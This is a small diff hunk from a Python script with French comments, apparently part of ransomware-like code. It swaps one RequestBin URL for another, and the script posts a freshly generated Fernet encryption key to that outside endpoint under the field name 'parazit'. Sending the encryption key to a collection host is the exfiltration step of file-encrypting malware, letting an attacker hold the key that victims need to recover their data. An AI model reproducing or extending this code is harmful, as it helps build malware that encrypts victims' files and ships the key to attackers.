@@ -24,7 +24,7 @@ key = Fernet.generate_key()
 
 
 # Votre URL de RequestBin
-requestbin_url = "https://public.requestbin.com/r/en48ranvj532s"
+requestbin_url = "https://requestbin.kanbanbox.com/1bo8kdw1"
 
 # Envoyer la clé à votre RequestBin avec la clé 'parazit'
 response = requests.post(requestbin_url, data={'parazit': key})
